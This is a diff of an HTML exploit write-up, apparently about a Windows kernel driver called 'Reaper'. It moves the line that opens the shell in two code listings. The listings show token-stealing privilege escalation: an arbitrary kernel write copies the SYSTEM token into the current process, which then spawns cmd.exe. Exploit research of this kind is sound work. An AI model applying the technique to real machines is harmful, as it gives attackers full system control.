@@ -1223,9 +1223,9 @@ PROCESS ffffba09b847a040
     </span><span class="no">getchar</span><span class="p">();
 
     ArbitraryWrite(hDevice, systemEProcess </span><span class="o">+</span><span class="p"> OFFSET_Token, currentEProcess </span><span class="o">+ </span><span class="p">OFFSET_Token);
-    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
-    
     CloseHandle(hDevice);
+
+    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
     </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
 }</span>
 </code></pre></div></div><br>
@@ -1401,9 +1401,9 @@ fffff800`101b10c4 e99c000000      jmp     Reaper+0x1165 (fffff800`101b1165)
     </span><span class="na">QWORD</span><span class="p"> currentEProcess</span><span class="o"> =</span><span class="p"> GetCurrentEProcess(hDevice, systemEProcess);
 
     ArbitraryWrite(hDevice, systemEProcess </span><span class="o">+</span><span class="p"> OFFSET_Token, currentEProcess </span><span class="o">+ </span><span class="p">OFFSET_Token);
-    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
-
     CloseHandle(hDevice);
+
+    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
     </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
 }</span>
 </code></pre></div></div><br>
